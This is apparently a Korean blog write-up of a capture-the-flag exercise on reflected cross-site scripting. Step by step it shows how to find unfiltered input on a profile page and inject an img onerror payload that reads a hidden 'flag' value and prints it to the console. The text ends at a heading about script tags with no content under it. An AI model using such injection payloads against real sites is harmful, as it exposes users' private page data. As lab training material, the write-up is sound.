---
layout: post
title: "CTF-Basic Script Prac (XSS)"
date: 2025-06-23 10:00:00 +0900
categories: [XSS]
tags: [XSS, Cookie, HTML Entity, 스크립트 우회]
---
## Basic Script Prac
CTF 문제  
목표: 마이페이지의 Flag Here..! 라고 적혀져 있는 데이터를 자바스크립트에서 가져오기 (마이페이지 속 개인정보를 가져올 수 있다)  
<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.12.26 am.png' | relative_url }}" style="width:500px; height:auto;" alt="테스트 이미지">  


### 1. 개발자도구에서 Flag Here..! 부분을 선택하여 name 기반으로 데이터를 가져올 수 있다는 것을 파악 할 수 있습니다.  
<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.18.03 am.png' | relative_url }}" style="width:800px; height:auto;" alt="테스트 이미지"> 

### 2. getElementsByName을 사용하여 info를 불러옵니다.
<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.25.25 am.png' | relative_url }}" style="width:800px; height:auto;" alt="테스트 이미지"> 

### 3. placeholder 안에 목표 데이터가 있는 것을 확인 할 수 있습니다. placeholder를 출력해봅니다.
<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.28.11 am.png' | relative_url }}" style="width:800px; height:auto;" alt="테스트 이미지"> 

### 4. 아래와 같이 입력하여 콘솔에서 데이터를 출력하며 데이터가 제대로 추출되는지 확인합니다.
- var secretData = document.getElementsByName('info')[0].placeholder;   
-  console.log(secretData);  
<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.32.52 am.png' | relative_url }}" style="width:800px; height:auto;" alt="테스트 이미지"> 

### 5. XSS 취약점 찾기 (Reflected XSS)  
아래와 같이 마이페이지 user이름에 스크립트 삽입 여부를 확인 할 수 있는 특수문자 <'"> 를 넣었을 때, Response에 필터링 되지 않고 그대로 나타나는 것을 확인 할 수 있습니다. (즉 XSS 취약점이 있다는 것)
<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.35.55 am.png' | relative_url }}" style="width:800px; height:auto;" alt="테스트 이미지"> 

### 6. alert(1) 실행 해보기
- Input 태그를 닫아줍니다. "> 
- img 태그 삽입 시도합니다. <img+src=x+onerror="alert(1)  
<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.44.03 am.png' | relative_url }}" style="width:800px; height:auto;" alt="테스트 이미지"> 

- URL을 복사하여 알람(1)이 나오는지 확인합니다.
<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.46.22 am.png' | relative_url }}" style="width:800px; height:auto;" alt="테스트 이미지"> 


### 7. 종합  
URL을 복사하여 실행하게 되면 inspector 콘솔 창에 Flag Here..! 라고 데이터가 출력되는 것을 볼 수 있습니다.
- "><img+src=x+onerror="var+secretData=document.getElementsByName('info')[0].placeholder;console.log(secretData);

<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.52.38 am.png' | relative_url }}" style="width:800px; height:auto;" alt="테스트 이미지"> 

<img src="{{ '/assets/img/2025-06-24-CTF-Basic Script Prac (XSS)/Screenshot 2025-06-25 at 1.55.23 am.png' | relative_url }}" style="width:800px; height:auto;" alt="테스트 이미지"> 


-----------------------------
## 만약, onerror 대신에 script 태그를 사용하게 될 경우 (자바스크립트가 실행되는 시점이 다르다)

